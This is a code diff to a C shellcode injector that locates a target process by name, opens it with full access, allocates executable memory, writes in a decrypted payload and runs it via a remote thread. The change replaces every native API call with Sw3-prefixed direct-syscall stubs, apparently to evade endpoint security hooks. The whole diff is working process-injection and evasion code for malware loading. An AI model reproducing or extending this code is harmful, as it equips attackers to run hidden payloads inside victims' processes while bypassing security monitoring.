@@ -73,7 +73,7 @@ int FindTarget(const wchar_t* target_process) {
 	buffer = malloc(buffer_size);
 	NTSTATUS status;
 
-	while ((status = NtQuerySystemInformation(SystemProcessInformation, buffer, buffer_size, &needed_size)) == STATUS_INFO_LENGTH_MISMATCH) {
+	while ((status = Sw3NtQuerySystemInformation(SystemProcessInformation, buffer, buffer_size, &needed_size)) == STATUS_INFO_LENGTH_MISMATCH) {
 		buffer_size = needed_size;
 		buffer = realloc(buffer, buffer_size);
 	}
@@ -137,12 +137,12 @@ void inject_shellcode_procname_syscalls(unsigned char *shellcode, int shellcode_
 
     // Access target process
     DEBUG_PRINT("Accessing target process...\n");
-    NtOpenProcess(&hProc, PROCESS_ALL_ACCESS, &object_attributes, &clientId);
+    Sw3NtOpenProcess(&hProc, PROCESS_ALL_ACCESS, &object_attributes, &clientId);
 
     // Allocate target memory for the shellcode
     DEBUG_PRINT("Allocating memory in target process...\n");
 
-    NtAllocateVirtualMemory(hProc, &remote_process_buffer, 0, (PULONG)&buf_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    Sw3NtAllocateVirtualMemory(hProc, &remote_process_buffer, 0, (PULONG)&buf_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
     DEBUG_PRINT("Decrypting payload\n");
     // Decrypt payload
@@ -150,14 +150,14 @@ void inject_shellcode_procname_syscalls(unsigned char *shellcode, int shellcode_
 
     // Write shellcode into allocated target buffer
     DEBUG_PRINT("Writing shellcode into allocated target buffer...\n");    
-    NtWriteVirtualMemory(hProc, remote_process_buffer, buf_pointer, sizeof(buf), 0);
+    Sw3NtWriteVirtualMemory(hProc, remote_process_buffer, buf_pointer, sizeof(buf), 0);
     
     // Create and start new thread in the remote process, executing the shellcode
     DEBUG_PRINT("Creating new remote thread to execute shellcode...\n");
-    NtCreateThreadEx(&hThread, 0x1FFFFF, NULL, hProc, (LPTHREAD_START_ROUTINE)remote_process_buffer, NULL, FALSE, NULL, NULL, NULL, NULL);
+    Sw3NtCreateThreadEx(&hThread, 0x1FFFFF, NULL, hProc, (LPTHREAD_START_ROUTINE)remote_process_buffer, NULL, FALSE, NULL, NULL, NULL, NULL);
 
-    NtClose(hThread);
+    Sw3NtClose(hThread);
 
     // Close handle of the opened process
-	NtClose(hProc);
+	Sw3NtClose(hProc);
 }
